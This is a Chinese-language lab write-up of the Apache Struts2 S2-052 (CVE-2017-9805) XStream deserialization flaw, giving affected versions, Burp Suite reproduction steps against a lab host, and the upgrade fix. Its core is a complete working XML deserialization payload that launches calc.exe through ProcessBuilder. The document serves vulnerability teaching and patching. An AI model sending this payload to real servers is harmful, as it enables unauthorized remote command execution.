# S2-052

## 漏洞简介
Struts是Apache基金会的一个开源项目，Struts通过采用Java Servlet/JSP技术，实现了基于Java EE Web应用的Model-View-Controller(MVC)设计模式的应用框架，是MVC经典设计模式中的一个经典产品。

Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-052，CVE编号CVE-2017-9805。

Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程访问。

## 影响范围

Struts 2.5 - Struts 2.5.12

不受影响的版本

Struts 2.5.13

## 漏洞分析

Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程访问。

## 漏洞复现

步骤1：开启代理，访问目标网站

开启Burp Suite和浏览器的代理功能(127.0.0.1:8090),然后在浏览器中输入目标地址，172.16.11.2:8080/struts2-rest-showcase/orders打开目标页面。

步骤2：抓取POST数据包

开启Burp Suite的抓包功能，然后在目标页面中随便选取一个ID进行编辑。

编辑的内容我们这里任意填写一些数据即可，同样也可以使用原来默认的内容。编辑完成之后点击Submit提交。

点击提交按钮之后，接着切换到Burp Suite，在proxy界面下看以看到抓取到的原始数据包，该界面下我们可以直接对数据包进行编辑。

步骤3：修改POST数据包

抓到数据包后，我们将当前数据包内容全选，然后使用如下数据包覆盖：

    POST /struts2-rest-showcase/orders/3/edit;jsessionid=F455F4577F3AC37C743B888B17C7A05E HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Content-Type: application/xml
    Content-Length: 1659
    Referer: http://127.0.0.1:8080/orders/3/edit
    Cookie: JSESSIONID=F455F4577F3AC37C743B888B17C7A05E
    Connection: close
    Upgrade-Insecure-Requests: 1


    <map>
    <entry>
    <jdk.nashorn.internal.objects.NativeString>
    <flags>0</flags>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized>
    <opmode>0</opmode>
    <serviceIterator class="javax.imageio.spi.FilterIterator">
    <iter class="javax.imageio.spi.FilterIterator">
    <iter class="java.util.Collections$EmptyIterator"/>
    <next class="java.lang.ProcessBuilder"> <command><string>C:\Windows\System32\calc.exe </string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter>
     <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class>
    <name>start</name> <parameter-types/> </method> <name>foo</name> </filter>
    <next class="string">foo</next> </serviceIterator> <lock/> </cipher>
    <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    </map>

修改完成之后，点击Intercept is on按钮放过数据包。

如图，已经成功的执行了命令，弹出了计算器

## 漏洞修复

通过本次实验，我们切身体会到了Struts2 052漏洞危害的严重性，简单的几条命令，就可以轻松拿到目标网站的shell，利用起来门槛低，危害大。网站的管理者可以将Struts 2的版本升级为Struts 2.5.13，即可防御此次漏洞。
